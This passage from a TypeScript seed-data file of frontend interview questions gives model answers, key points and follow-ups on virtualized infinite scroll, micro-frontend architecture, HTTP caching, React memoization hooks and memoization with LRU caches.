    isFetchingNextPage,
  } = useInfiniteQuery({
    queryKey: ['items'],
    queryFn: async ({ pageParam = 0 }) => {
      const response = await fetch(\`/api/items?cursor=\${pageParam}&limit=50\`);
      return response.json() as Promise<{ items: Item[]; nextCursor: string | null }>;
    },
    getNextPageParam: (lastPage) => lastPage.nextCursor,
    initialPageParam: 0,
  });
  
  // Flatten all pages into single array
  const allItems = useMemo(
    () => data?.pages.flatMap(page => page.items) ?? [],
    [data]
  );
  
  // Virtual list configuration
  const virtualizer = useVirtualizer({
    count: hasNextPage ? allItems.length + 1 : allItems.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 72, // Estimated row height
    overscan: 5, // Render 5 extra items above/below viewport
  });
  
  const virtualItems = virtualizer.getVirtualItems();
  
  // Trigger fetch when approaching end
  useEffect(() => {
    const lastItem = virtualItems[virtualItems.length - 1];
    
    if (
      lastItem &&
      lastItem.index >= allItems.length - 1 &&
      hasNextPage &&
      !isFetchingNextPage
    ) {
      fetchNextPage();
    }
  }, [virtualItems, allItems.length, hasNextPage, isFetchingNextPage, fetchNextPage]);
  
  return (
    <div
      ref={parentRef}
      className="h-[600px] overflow-auto"
    >
      <div
        style={{
          height: virtualizer.getTotalSize(),
          width: '100%',
          position: 'relative',
        }}
      >
        {virtualItems.map((virtualRow) => {
          const isLoaderRow = virtualRow.index >= allItems.length;
          const item = allItems[virtualRow.index];
          
          return (
            <div
              key={virtualRow.key}
              data-index={virtualRow.index}
              ref={virtualizer.measureElement}
              style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: '100%',
                transform: \`translateY(\${virtualRow.start}px)\`,
              }}
            >
              {isLoaderRow ? (
                <LoadingSpinner />
              ) : (
                <ItemRow item={item} />
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}
\`\`\`

## Variable Height Items

\`\`\`typescript
// For items with unpredictable heights (images, text)
const virtualizer = useVirtualizer({
  count: items.length,
  getScrollElement: () => parentRef.current,
  // Dynamic measurement instead of fixed estimate
  estimateSize: useCallback((index) => {
    // Return cached size if measured, estimate otherwise
    return measuredSizes.current.get(index) ?? 100;
  }, []),
  measureElement: (element) => {
    // Measure actual rendered height
    return element.getBoundingClientRect().height;
  },
});

// Handle resize
useEffect(() => {
  const observer = new ResizeObserver((entries) => {
    for (const entry of entries) {
      const index = Number(entry.target.dataset.index);
      const height = entry.contentRect.height;
      
      if (measuredSizes.current.get(index) !== height) {
        measuredSizes.current.set(index, height);
        virtualizer.measure(); // Re-calculate positions
      }
    }
  });
  
  // Observe all rendered items
  const elements = parentRef.current?.querySelectorAll('[data-index]');
  elements?.forEach(el => observer.observe(el));
  
  return () => observer.disconnect();
}, [virtualItems]);
\`\`\`

## Scroll Position Restoration

\`\`\`typescript
function useScrollRestoration(key: string) {
  const parentRef = useRef<HTMLDivElement>(null);
  
  // Save scroll position on unmount
  useEffect(() => {
    const element = parentRef.current;
    
    return () => {
      if (element) {
        sessionStorage.setItem(
          \`scroll-\${key}\`,
          JSON.stringify({ top: element.scrollTop })
        );
      }
    };
  }, [key]);
  
  // Restore scroll position on mount
  useLayoutEffect(() => {
    const saved = sessionStorage.getItem(\`scroll-\${key}\`);
    if (saved && parentRef.current) {
      const { top } = JSON.parse(saved);
      parentRef.current.scrollTop = top;
    }
  }, [key]);
  
  return parentRef;
}
\`\`\`

## Trade-offs: Infinite Scroll vs Pagination

| Aspect | Infinite Scroll | Pagination |
|--------|-----------------|------------|
| **User Engagement** | Higher - seamless browsing | Lower - requires clicks |
| **Performance** | Requires virtualization | Simpler, fixed DOM size |
| **Deep Linking** | Difficult - no stable URLs | Easy - page URLs |
| **SEO** | Poor without SSR | Excellent |
| **Memory** | Can grow unbounded | Fixed per page |
| **Footer Access** | Impossible with infinite content | Easy |
| **Accessibility** | Complex focus management | Standard navigation |
| **Back Button** | Breaks without state management | Works naturally |

## When to Use Each

**Infinite Scroll:**
- Social feeds (Twitter, Instagram)
- Image galleries
- Chat/messaging
- Discovery-focused browsing

**Pagination:**
- Search results
- Admin dashboards
- Data tables
- E-commerce product listings
- Content that needs deep linking

## Hybrid Approach: "Load More"

\`\`\`typescript
// Best of both worlds
function LoadMoreList() {
  const [page, setPage] = useState(1);
  const { data, isLoading } = useQuery({
    queryKey: ['items', page],
    queryFn: () => fetchItems(page),
  });
  
  return (
    <div>
      {data?.items.map(item => (
        <ItemRow key={item.id} item={item} />
      ))}
      
      {data?.hasMore && (
        <button
          onClick={() => setPage(p => p + 1)}
          disabled={isLoading}
        >
          {isLoading ? 'Loading...' : 'Load More'}
        </button>
      )}
    </div>
  );
}
\`\`\`

## Performance Considerations

1. **Overscan**: Render extra items outside viewport to prevent flashing
2. **Key Stability**: Use stable item IDs, not array indices
3. **Debounce Scroll**: Don't fetch on every scroll event
4. **Memory Limits**: Consider evicting old pages when list grows too large
5. **Skeleton Loading**: Show placeholders during fetch`,
    keyPoints: [
      "Understands virtualization is essential for large lists",
      "Knows TanStack Virtual or similar libraries",
      "Can implement scroll position restoration",
      "Articulates trade-offs between approaches",
      "Considers accessibility implications",
      'Mentions hybrid "load more" pattern',
    ],
    followUpQuestions: [
      "How would you handle items that expand/collapse with variable heights?",
      'How would you implement "jump to" functionality in a virtualized list?',
      "What if items can be reordered by the user?",
      "How would you handle infinite scroll with filters that change the dataset?",
    ],
    relatedTopics: [
      "virtualization",
      "pagination",
      "intersection-observer",
      "performance",
    ],
    source: "seed",
    commonAt: ["Meta", "Twitter", "Pinterest"],
  },
  {
    category: QUESTION_CATEGORIES.SYSTEM_DESIGN,
    difficulty: "senior",
    question:
      "Design a micro-frontend architecture for a large e-commerce platform where different teams own different parts of the application (product catalog, cart, checkout, user account). How would you handle shared state, routing, and deployments?",
    answer: `## Overview

Micro-frontends allow independent teams to develop, test, and deploy their features autonomously. The key challenges are shared state, consistent UX, and performance optimization across module boundaries.

## Architecture Options

### 1. Module Federation (Recommended for React)

\`\`\`javascript
// webpack.config.js - Shell Application
const { ModuleFederationPlugin } = require('webpack').container;

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'shell',
      remotes: {
        catalog: 'catalog@https://catalog.example.com/remoteEntry.js',
        cart: 'cart@https://cart.example.com/remoteEntry.js',
        checkout: 'checkout@https://checkout.example.com/remoteEntry.js',
        account: 'account@https://account.example.com/remoteEntry.js',
      },
      shared: {
        react: { singleton: true, requiredVersion: '^18.0.0' },
        'react-dom': { singleton: true, requiredVersion: '^18.0.0' },
        '@company/design-system': { singleton: true },
      },
    }),
  ],
};

// webpack.config.js - Catalog Micro-frontend
module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'catalog',
      filename: 'remoteEntry.js',
      exposes: {
        './ProductList': './src/components/ProductList',
        './ProductDetail': './src/pages/ProductDetail',
        './SearchBar': './src/components/SearchBar',
      },
      shared: {
        react: { singleton: true, requiredVersion: '^18.0.0' },
        'react-dom': { singleton: true, requiredVersion: '^18.0.0' },
      },
    }),
  ],
};
\`\`\`

### 2. Shell Application Structure

\`\`\`typescript
// Shell app - handles routing and composition
import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Dynamic imports from federated modules
const ProductList = lazy(() => import('catalog/ProductList'));
const ProductDetail = lazy(() => import('catalog/ProductDetail'));
const Cart = lazy(() => import('cart/CartPage'));
const Checkout = lazy(() => import('checkout/CheckoutFlow'));
const Account = lazy(() => import('account/AccountDashboard'));

function App() {
  return (
    <BrowserRouter>
      <GlobalProviders>
        <Header />
        <ErrorBoundary fallback={<ErrorPage />}>
          <Suspense fallback={<PageSkeleton />}>
            <Routes>
              <Route path="/products" element={<ProductList />} />
              <Route path="/products/:id" element={<ProductDetail />} />
              <Route path="/cart" element={<Cart />} />
              <Route path="/checkout/*" element={<Checkout />} />
              <Route path="/account/*" element={<Account />} />
            </Routes>
          </Suspense>
        </ErrorBoundary>
        <Footer />
      </GlobalProviders>
    </BrowserRouter>
  );
}
\`\`\`

## Shared State Management

### Event Bus Pattern

\`\`\`typescript
// Shared event bus for cross-module communication
type EventMap = {
  'cart:item-added': { productId: string; quantity: number };
  'cart:item-removed': { productId: string };
  'cart:updated': { itemCount: number; total: number };
  'user:logged-in': { userId: string };
  'user:logged-out': undefined;
};

class EventBus {
  private listeners = new Map<string, Set<Function>>();

  emit<K extends keyof EventMap>(event: K, data: EventMap[K]) {
    const handlers = this.listeners.get(event);
    handlers?.forEach(handler => handler(data));
  }

  on<K extends keyof EventMap>(
    event: K,
    handler: (data: EventMap[K]) => void
  ): () => void {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, new Set());
    }
    this.listeners.get(event)!.add(handler);
    
    return () => this.listeners.get(event)?.delete(handler);
  }
}

// Singleton instance shared across modules
export const eventBus = new EventBus();

// Usage in Cart module
eventBus.emit('cart:item-added', { productId: '123', quantity: 2 });

// Usage in Header component (Shell)
useEffect(() => {
  return eventBus.on('cart:updated', ({ itemCount }) => {
    setCartBadge(itemCount);
  });
}, []);
\`\`\`

### Shared State Store

\`\`\`typescript
// @company/shared-state package
import { create } from 'zustand';
import { subscribeWithSelector } from 'zustand/middleware';

interface SharedState {
  // Cart state
  cart: {
    items: CartItem[];
    total: number;
  };
  
  // User state
  user: {
    isAuthenticated: boolean;
    profile: UserProfile | null;
  };
  
  // Actions
  addToCart: (item: CartItem) => void;
  removeFromCart: (productId: string) => void;
  setUser: (user: UserProfile | null) => void;
}

// Create store with persistence
export const useSharedStore = create<SharedState>()(
  subscribeWithSelector(
    persist(
      (set) => ({
        cart: { items: [], total: 0 },
        user: { isAuthenticated: false, profile: null },
        
        addToCart: (item) =>
          set((state) => {
            const items = [...state.cart.items, item];
            return {
              cart: {
                items,
                total: items.reduce((sum, i) => sum + i.price * i.quantity, 0),
              },
            };
          }),
          
        removeFromCart: (productId) =>
          set((state) => {
            const items = state.cart.items.filter(i => i.productId !== productId);
            return {
              cart: {
                items,
                total: items.reduce((sum, i) => sum + i.price * i.quantity, 0),
              },
            };
          }),
          
        setUser: (profile) =>
          set({
            user: {
              isAuthenticated: !!profile,
              profile,
            },
          }),
      }),
      { name: 'shared-state' }
    )
  )
);

// Selector hooks for specific slices
export const useCart = () => useSharedStore((state) => state.cart);
export const useUser = () => useSharedStore((state) => state.user);
\`\`\`

## Routing Strategy

\`\`\`typescript
// Shell owns top-level routes, delegates to micro-frontends
// Each micro-frontend handles its own sub-routes

// Checkout micro-frontend internal routing
function CheckoutFlow() {
  return (
    <Routes>
      <Route index element={<ShippingStep />} />
      <Route path="payment" element={<PaymentStep />} />
      <Route path="review" element={<ReviewStep />} />
      <Route path="confirmation/:orderId" element={<Confirmation />} />
    </Routes>
  );
}

// Cross-module navigation
import { useNavigate } from 'react-router-dom';

function AddToCartButton({ product }: { product: Product }) {
  const navigate = useNavigate();
  const addToCart = useSharedStore((s) => s.addToCart);
  
  const handleClick = () => {
    addToCart({
      productId: product.id,
      name: product.name,
      price: product.price,
      quantity: 1,
    });
    
    // Navigate to cart (owned by different team)
    navigate('/cart');
  };
  
  return <button onClick={handleClick}>Add to Cart</button>;
}
\`\`\`

## Deployment Strategy

\`\`\`yaml
# Each micro-frontend has independent CI/CD
# Shell monitors health of all remotes

# catalog-deploy.yml
name: Deploy Catalog
on:
  push:
    branches: [main]
    paths:
      - 'apps/catalog/**'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Build
        run: |
          cd apps/catalog
          npm ci
          npm run build
          
      - name: Deploy to CDN
        run: |
          aws s3 sync dist/ s3://mfe-catalog/
          aws cloudfront create-invalidation --distribution-id \${{ secrets.CF_DIST_ID }}
          
      - name: Health Check
        run: |
          curl -f https://catalog.example.com/remoteEntry.js || exit 1
          
      - name: Notify Shell
        run: |
          # Optional: trigger shell to update remote version
          curl -X POST https://shell.example.com/api/mfe-updated \\
            -d '{"module": "catalog", "version": "\${{ github.sha }}"}'
\`\`\`

## Version Management

\`\`\`typescript
// Dynamic remote loading with version control
async function loadRemote(moduleName: string) {
  // Fetch current versions from config service
  const config = await fetch('/api/mfe-config').then(r => r.json());
  const remoteUrl = config.remotes[moduleName];
  
  // Dynamically inject script
  await new Promise<void>((resolve, reject) => {
    const script = document.createElement('script');
    script.src = remoteUrl;
    script.onload = () => resolve();
    script.onerror = () => reject(new Error(\`Failed to load \${moduleName}\`));
    document.head.appendChild(script);
  });
  
  // Access federated module
  // @ts-expect-error - dynamic federation
  return window[moduleName];
}

// Graceful degradation
function MicroFrontendLoader({ 
  module, 
  fallback 
}: { 
  module: string; 
  fallback: React.ReactNode;
}) {
  const [Component, setComponent] = useState<React.ComponentType | null>(null);
  const [error, setError] = useState<Error | null>(null);
  
  useEffect(() => {
    loadRemote(module)
      .then((remote) => setComponent(() => remote.default))
      .catch(setError);
  }, [module]);
  
  if (error) return <>{fallback}</>;
  if (!Component) return <LoadingSpinner />;
  
  return <Component />;
}
\`\`\`

## Key Considerations

1. **Shared Dependencies**: Use singleton pattern for React, design system
2. **CSS Isolation**: CSS Modules or CSS-in-JS with unique prefixes
3. **Error Boundaries**: Isolate failures to individual micro-frontends
4. **Performance**: Lazy load micro-frontends, shared chunks for common code
5. **Testing**: Contract tests between shell and micro-frontends
6. **Monitoring**: Track load times, errors per micro-frontend`,
    keyPoints: [
      "Understands Module Federation mechanics",
      "Can design event-based cross-module communication",
      "Knows shared state patterns (store vs event bus)",
      "Considers independent deployment strategies",
      "Addresses version management and rollback",
      "Mentions error boundaries for isolation",
    ],
    followUpQuestions: [
      "How would you handle a micro-frontend that needs to be SSR'd?",
      "What if two teams need to share a complex component?",
      "How would you implement feature flags across micro-frontends?",
      "How do you ensure consistent styling across teams?",
    ],
    relatedTopics: [
      "module-federation",
      "webpack",
      "deployment",
      "state-management",
    ],
    source: "seed",
    commonAt: ["Amazon", "IKEA", "Spotify", "Zalando"],
  },
];

// ============================================================================
// CACHING & MEMOIZATION
// ============================================================================

const cachingMemoizationQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.CACHING_MEMOIZATION,
    difficulty: "senior",
    question:
      "Explain the complete HTTP caching lifecycle. How do Cache-Control headers work, and what's the difference between browser cache, CDN cache, and application-level cache?",
    answer: `## HTTP Caching Lifecycle

### 1. Cache-Control Headers Deep Dive

\`\`\`
Client Request
     │
     ┼
┌─────────────┐     Cache Miss      ┌─────────────┐
│   Browser   │ ──────────────────► │     CDN     │
│    Cache    │                     │    Cache    │
└─────────────┘                     └─────────────┘
     │ Cache Hit                          │ Cache Miss
     ┼                                    ┼
  Response                          ┌─────────────┐
                                    │   Origin    │
                                    │   Server    │
                                    └─────────────┘
\`\`\`

### Cache-Control Directives

\`\`\`http
# Maximum caching - static assets with hash in filename
Cache-Control: public, max-age=31536000, immutable

# API responses - no caching
Cache-Control: no-store

# Dynamic pages - cache but revalidate
Cache-Control: private, no-cache, must-revalidate

# Shared cache (CDN) different from browser
Cache-Control: public, max-age=60, s-maxage=3600, stale-while-revalidate=86400
\`\`\`

**Directive meanings:**

| Directive | Meaning |
|-----------|---------|
| \`public\` | Can be cached by CDN and browser |
| \`private\` | Only browser can cache (user-specific data) |
| \`max-age=N\` | Fresh for N seconds |
| \`s-maxage=N\` | CDN-specific max-age (overrides max-age for shared caches) |
| \`no-cache\` | Must revalidate with server before using |
| \`no-store\` | Never cache (sensitive data) |
| \`must-revalidate\` | Don't serve stale on error |
| \`stale-while-revalidate=N\` | Serve stale while fetching fresh in background |
| \`immutable\` | Content will never change (skip revalidation) |

### 2. ETag and Conditional Requests

\`\`\`typescript
// Server generates ETag from content hash
app.get('/api/user/:id', async (req, res) => {
  const user = await getUser(req.params.id);
  const etag = crypto
    .createHash('md5')
    .update(JSON.stringify(user))
    .digest('hex');
  
  // Check if client has current version
  if (req.headers['if-none-match'] === etag) {
    return res.status(304).end(); // Not Modified
  }
  
  res.set({
    'ETag': etag,
    'Cache-Control': 'private, no-cache',
  });
  res.json(user);
});
\`\`\`

**Conditional request flow:**
1. First request: Server returns data + ETag
2. Browser caches response with ETag
3. Subsequent requests: Browser sends \`If-None-Match: <etag>\`
4. Server compares ETags:
   - Match → 304 Not Modified (no body)
   - No match → 200 with new data + new ETag

### 3. Three Layers of Caching

#### Browser Cache (Private)

\`\`\`typescript
// Service Worker for fine-grained control
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => {
      // Cache-first strategy
      if (cached) {
        // Update cache in background
        fetch(event.request).then((response) => {
          caches.open('v1').then((cache) => {
            cache.put(event.request, response);
          });
        });
        return cached;
      }
      
      // Network fallback
      return fetch(event.request);
    })
  );
});
\`\`\`

#### CDN Cache (Shared)

\`\`\`typescript
// Next.js ISR - CDN + Origin coordination
export const revalidate = 60; // Revalidate every 60 seconds

export default async function ProductPage({ params }: { params: { id: string } }) {
  const product = await getProduct(params.id);
  
  // This page will be:
  // 1. Generated at build time
  // 2. Served from CDN cache
  // 3. Revalidated in background after 60s
  
  return <ProductDetails product={product} />;
}
\`\`\`

#### Application Cache (In-Memory)

\`\`\`typescript
// React Query with stale-while-revalidate pattern
const { data: user } = useQuery({
  queryKey: ['user', userId],
  queryFn: () => fetchUser(userId),
  staleTime: 5 * 60 * 1000, // Fresh for 5 minutes
  gcTime: 30 * 60 * 1000, // Keep in memory for 30 minutes
});

// Manual cache with Map
const cache = new Map<string, { data: unknown; timestamp: number }>();
const TTL = 60_000; // 1 minute

async function cachedFetch<T>(key: string, fetcher: () => Promise<T>): Promise<T> {
  const cached = cache.get(key);
  
  if (cached && Date.now() - cached.timestamp < TTL) {
    return cached.data as T;
  }
  
  const data = await fetcher();
  cache.set(key, { data, timestamp: Date.now() });
  
  return data;
}
\`\`\`

### 4. Cache Invalidation Strategies

\`\`\`typescript
// 1. Time-based (TTL)
Cache-Control: max-age=3600

// 2. Version-based (Cache busting)
<script src="/app.js?v=1.2.3"></script>
<script src="/app.a1b2c3d4.js"></script> // Content hash

// 3. Event-based (Webhooks)
async function handleProductUpdate(productId: string) {
  // Purge CDN cache
  await fetch('https://api.cdn.com/purge', {
    method: 'POST',
    body: JSON.stringify({ paths: [\`/products/\${productId}\`] }),
  });
  
  // Invalidate React Query cache
  queryClient.invalidateQueries({ queryKey: ['product', productId] });
}

// 4. Tag-based (Surrogate keys)
// Response header: Surrogate-Key: product-123 category-shoes
// Purge all products in category: purge tag "category-shoes"
\`\`\`

### 5. Common Caching Patterns

\`\`\`typescript
// Stale-While-Revalidate in JavaScript
async function swr<T>(
  key: string,
  fetcher: () => Promise<T>,
  options: { staleTime: number; revalidate: boolean } = { staleTime: 60000, revalidate: true }
): Promise<T> {
  const cached = cache.get(key);
  const now = Date.now();
  
  // Return stale data immediately if available
  if (cached) {
    const isStale = now - cached.timestamp > options.staleTime;
    
    if (isStale && options.revalidate) {
      // Revalidate in background (don't await)
      fetcher().then(data => {
        cache.set(key, { data, timestamp: Date.now() });
      });
    }
    
    return cached.data as T;
  }
  
  // No cache - fetch and wait
  const data = await fetcher();
  cache.set(key, { data, timestamp: now });
  return data;
}
\`\`\`

## Key Differences Summary

| Aspect | Browser Cache | CDN Cache | App Cache |
|--------|---------------|-----------|-----------|
| **Location** | User's device | Edge servers | App memory/DB |
| **Scope** | Single user | All users | Configurable |
| **Control** | Cache-Control headers | CDN config + headers | Application code |
| **Invalidation** | Headers, versioning | Purge API, TTL | Manual, events |
| **Use case** | Static assets, user data | Global static content | Computed data, API responses |`,
    keyPoints: [
      "Understands all Cache-Control directives",
      "Knows ETag/conditional request flow",
      "Can explain three cache layers and their purposes",
      "Understands stale-while-revalidate pattern",
      "Knows cache invalidation strategies",
      "Can implement cache in JavaScript",
    ],
    followUpQuestions: [
      "When would you use no-cache vs no-store?",
      "How do you handle cache invalidation for user-specific data?",
      "What's the tradeoff between long max-age and cache busting?",
      "How would you implement offline-first caching?",
    ],
    relatedTopics: ["http-headers", "cdn", "service-worker", "react-query"],
    source: "seed",
    commonAt: ["Cloudflare", "Vercel", "Netflix"],
  },
  {
    category: QUESTION_CATEGORIES.CACHING_MEMOIZATION,
    difficulty: "mid",
    question:
      "What's the difference between useMemo and useCallback in React? When would you use each, and what are the common pitfalls?",
    answer: `## Core Difference

\`\`\`typescript
// useMemo: Memoizes a COMPUTED VALUE
const expensiveValue = useMemo(() => {
  return computeExpensiveValue(a, b);
}, [a, b]);

// useCallback: Memoizes a FUNCTION REFERENCE
const handleClick = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

// useCallback is actually syntactic sugar for:
const handleClick = useMemo(() => {
  return () => doSomething(a, b);
}, [a, b]);
\`\`\`

## When to Use useMemo

### 1. Expensive Calculations

\`\`\`typescript
function ProductList({ products, filters }: Props) {
  // ✅ Good: Filtering/sorting large arrays
  const filteredProducts = useMemo(() => {
    return products
      .filter(p => p.category === filters.category)
      .filter(p => p.price >= filters.minPrice)
      .sort((a, b) => a.price - b.price);
  }, [products, filters.category, filters.minPrice]);

  return (
    <ul>
      {filteredProducts.map(product => (
        <ProductCard key={product.id} product={product} />
      ))}
    </ul>
  );
}
\`\`\`

### 2. Referential Equality for useEffect

\`\`\`typescript
function SearchResults({ query }: { query: string }) {
  // ✅ Good: Object reference used in dependency array
  const searchParams = useMemo(() => ({
    query,
    limit: 20,
    offset: 0,
  }), [query]);

  useEffect(() => {
    fetchResults(searchParams);
  }, [searchParams]); // Won't re-run unless query changes

  // ❌ Bad: New object every render
  useEffect(() => {
    fetchResults({ query, limit: 20, offset: 0 });
  }, [{ query, limit: 20, offset: 0 }]); // Always re-runs!
}
\`\`\`

### 3. Passing to Memoized Children

\`\`\`typescript
const MemoizedChart = memo(function Chart({ data }: { data: DataPoint[] }) {
  // Expensive chart rendering
  return <svg>...</svg>;
});

function Dashboard({ rawData }: { rawData: RawData[] }) {
  // ✅ Good: Stable reference for memo'd child
  const chartData = useMemo(() => {
    return rawData.map(d => ({
      x: d.timestamp,
      y: d.value,
    }));
  }, [rawData]);

  return <MemoizedChart data={chartData} />;
}
\`\`\`

## When to Use useCallback

### 1. Passing Callbacks to Memoized Children

\`\`\`typescript
const MemoizedButton = memo(function Button({ 
  onClick, 
  label 
}: { 
  onClick: () => void; 
  label: string;
}) {
  console.log('Button rendered');
  return <button onClick={onClick}>{label}</button>;
});

function Parent() {
  const [count, setCount] = useState(0);
  
  // ✅ Good: Stable function reference
  const handleClick = useCallback(() => {
    setCount(c => c + 1);
  }, []); // No dependencies - uses updater function

  return (
    <>
      <span>Count: {count}</span>
      <MemoizedButton onClick={handleClick} label="Increment" />
    </>
  );
}
\`\`\`

### 2. Dependencies in useEffect

\`\`\`typescript
function SearchComponent({ userId }: { userId: string }) {
  // ✅ Good: Stable function for effect dependency
  const fetchUserData = useCallback(async () => {
    const response = await fetch(\`/api/users/\${userId}\`);
    return response.json();
  }, [userId]);

  useEffect(() => {
    fetchUserData().then(setUser);
  }, [fetchUserData]);
}
\`\`\`

### 3. Custom Hooks Returning Functions

\`\`\`typescript
function useDebounce<T extends (...args: unknown[]) => unknown>(
  fn: T,
  delay: number
): T {
  // ✅ Good: Return stable debounced function
  return useCallback(
    debounce(fn, delay) as T,
    [fn, delay]
  );
}
\`\`\`

## Common Pitfalls

### 1. Premature Optimization

\`\`\`typescript
// ❌ Bad: Unnecessary memoization
function SimpleComponent({ name }: { name: string }) {
  // This is overkill - string concatenation is fast
  const greeting = useMemo(() => \`Hello, \${name}!\`, [name]);
  
  // This is overkill - function is cheap to create
  const handleClick = useCallback(() => {
    console.log('clicked');
  }, []);

  return <div onClick={handleClick}>{greeting}</div>;
}

// ✅ Good: Just use plain values
function SimpleComponent({ name }: { name: string }) {
  const greeting = \`Hello, \${name}!\`;
  const handleClick = () => console.log('clicked');
  
  return <div onClick={handleClick}>{greeting}</div>;
}
\`\`\`

### 2. Missing Dependencies

\`\`\`typescript
function Counter() {
  const [count, setCount] = useState(0);
  
  // ❌ Bad: Stale closure - always logs 0
  const logCount = useCallback(() => {
    console.log(count);
  }, []); // Missing 'count' dependency

  // ✅ Good: Use ref for latest value without re-creating
  const countRef = useRef(count);
  countRef.current = count;
  
  const logCount = useCallback(() => {
    console.log(countRef.current);
  }, []);
}
\`\`\`

### 3. Object/Array Dependencies

\`\`\`typescript
function Component({ config }: { config: { theme: string } }) {
  // ❌ Bad: New object every render breaks memoization
  const handleClick = useCallback(() => {
    applyTheme(config);
  }, [config]); // config is new object each render!

  // ✅ Good: Depend on primitive values
  const handleClick = useCallback(() => {
    applyTheme({ theme: config.theme });
  }, [config.theme]);
}
\`\`\`

### 4. useMemo for JSX

\`\`\`typescript
// ❌ Bad: Don't memoize JSX (use memo() instead)
function Parent({ items }: { items: Item[] }) {
  const list = useMemo(() => (
    <ul>
      {items.map(item => <li key={item.id}>{item.name}</li>)}
    </ul>
  ), [items]);
  
  return <div>{list}</div>;
}

// ✅ Good: Use memo for component-level optimization
const ItemList = memo(function ItemList({ items }: { items: Item[] }) {
  return (
    <ul>
      {items.map(item => <li key={item.id}>{item.name}</li>)}
    </ul>
  );
});
\`\`\`

## Decision Framework

\`\`\`
Should I use useMemo/useCallback?
│
┌─► Is this fixing a measured performance problem?
│   └─► No → Don't use it (premature optimization)
│
┌─► Is the value passed to a memo'd child?
│   └─► Yes → Consider useMemo/useCallback
│
┌─► Is the value in a useEffect dependency array?
│   └─► Yes → Probably need useMemo/useCallback
│
┌─► Is the computation expensive (>1ms)?
│   └─► Yes → Use useMemo
│
└─► Profile first, optimize second
\`\`\``,
    keyPoints: [
      "Knows useMemo is for values, useCallback is for functions",
      "Understands referential equality for dependency arrays",
      "Can identify premature optimization",
      "Knows common pitfalls (stale closures, missing deps)",
      "Understands when NOT to use memoization",
    ],
    followUpQuestions: [
      "How would you measure if memoization is actually helping?",
      "What's the memory cost of excessive memoization?",
      "How does React.memo differ from useMemo?",
      "When would useMemo re-compute even with same dependencies?",
    ],
    relatedTopics: [
      "react-memo",
      "performance",
      "hooks",
      "referential-equality",
    ],
    source: "seed",
    commonAt: ["Meta", "Airbnb", "Netflix"],
  },
  {
    category: QUESTION_CATEGORIES.CACHING_MEMOIZATION,
    difficulty: "senior",
    question:
      "How would you implement a memoization function that handles complex objects as arguments? What about cache eviction strategies?",
    answer: `## Basic Memoization

\`\`\`typescript
// Simple memoization with primitive arguments
function memoize<T extends (...args: unknown[]) => unknown>(fn: T): T {
  const cache = new Map<string, ReturnType<T>>();
  
  return ((...args: Parameters<T>) => {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key)!;
    }
    
    const result = fn(...args) as ReturnType<T>;
    cache.set(key, result);
    return result;
  }) as T;
}

// Usage
const expensiveCalculation = memoize((a: number, b: number) => {
  console.log('Computing...');
  return a * b;
});

expensiveCalculation(2, 3); // Computing... → 6
expensiveCalculation(2, 3); // → 6 (cached)
\`\`\`

## Handling Complex Objects

### Problem with JSON.stringify

\`\`\`typescript
// ❌ Issues with JSON.stringify:
// 1. Order sensitivity: {a:1,b:2} !== {b:2,a:1}
// 2. Can't handle circular references
// 3. Loses functions, undefined, symbols
// 4. Date objects become strings

const obj1 = { a: 1, b: 2 };
const obj2 = { b: 2, a: 1 };
JSON.stringify(obj1) !== JSON.stringify(obj2); // Different strings!
\`\`\`

### Solution 1: Stable Serialization

\`\`\`typescript
function stableStringify(obj: unknown): string {
  if (obj === null || typeof obj !== 'object') {
    return JSON.stringify(obj);
  }
  
  if (Array.isArray(obj)) {
    return '[' + obj.map(stableStringify).join(',') + ']';
  }
  
  // Sort keys for consistent ordering
  const keys = Object.keys(obj).sort();
  const pairs = keys.map(key => 
    \`"\${key}":\${stableStringify((obj as Record<string, unknown>)[key])}\`
  );
  
  return '{' + pairs.join(',') + '}';
}

function memoizeWithStableKeys<T extends (...args: unknown[]) => unknown>(fn: T): T {
  const cache = new Map<string, ReturnType<T>>();
  
  return ((...args: Parameters<T>) => {
    const key = stableStringify(args);
    
    if (cache.has(key)) {
      return cache.get(key)!;
    }
    
    const result = fn(...args) as ReturnType<T>;
    cache.set(key, result);
    return result;
  }) as T;
}
\`\`\`

### Solution 2: WeakMap for Object References

\`\`\`typescript
// For single object argument - uses reference equality
function memoizeOne<T extends (arg: object) => unknown>(fn: T): T {
  const cache = new WeakMap<object, ReturnType<T>>();
  
  return ((arg: object) => {
    if (cache.has(arg)) {
      return cache.get(arg)!;
    }
    
    const result = fn(arg) as ReturnType<T>;
    cache.set(arg, result);
    return result;
  }) as T;
}

// For multiple arguments - nested WeakMaps
function memoizeMultipleObjects<T extends (...args: object[]) => unknown>(fn: T): T {
  const cache = new WeakMap<object, WeakMap<object, unknown>>();
  
  return ((...args: object[]) => {
    let current: WeakMap<object, unknown> = cache;
    
    for (let i = 0; i < args.length - 1; i++) {
      if (!current.has(args[i])) {
        current.set(args[i], new WeakMap());
      }
      current = current.get(args[i]) as WeakMap<object, unknown>;
    }
    
    const lastArg = args[args.length - 1];
    if (current.has(lastArg)) {
      return current.get(lastArg) as ReturnType<T>;
    }
    
    const result = fn(...args);
    current.set(lastArg, result);
    return result as ReturnType<T>;
  }) as T;
}
\`\`\`

## Cache Eviction Strategies

### 1. LRU (Least Recently Used)

\`\`\`typescript
class LRUCache<K, V> {
  private cache = new Map<K, V>();
  private maxSize: number;

  constructor(maxSize: number) {
    this.maxSize = maxSize;
  }

  get(key: K): V | undefined {
    if (!this.cache.has(key)) {
      return undefined;
    }
    
    // Move to end (most recently used)
    const value = this.cache.get(key)!;
    this.cache.delete(key);
    this.cache.set(key, value);
    
    return value;
  }

  set(key: K, value: V): void {
    // Delete if exists (to update position)
    if (this.cache.has(key)) {
      this.cache.delete(key);
    }
    
    // Evict oldest if at capacity
    if (this.cache.size >= this.maxSize) {
